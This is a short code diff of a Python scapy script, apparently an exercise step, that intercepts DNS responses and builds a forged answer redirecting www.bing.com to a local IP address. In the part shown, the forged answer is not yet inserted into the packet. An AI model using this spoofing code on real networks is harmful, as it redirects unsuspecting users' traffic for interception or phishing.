@@ -10,7 +10,12 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     # see if scapy has a DNS response
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing Target")
+            # use scapy to create dns response
+            answer = scapy.DNSRR(rrname=qname, rdata="172.16.149.128")
+    # print(scapy_packet.show())
     # show the packet payload, need to be converted to a scapy packet to manipulate it
     # forwards the packets with .accept()
     packet.accept()
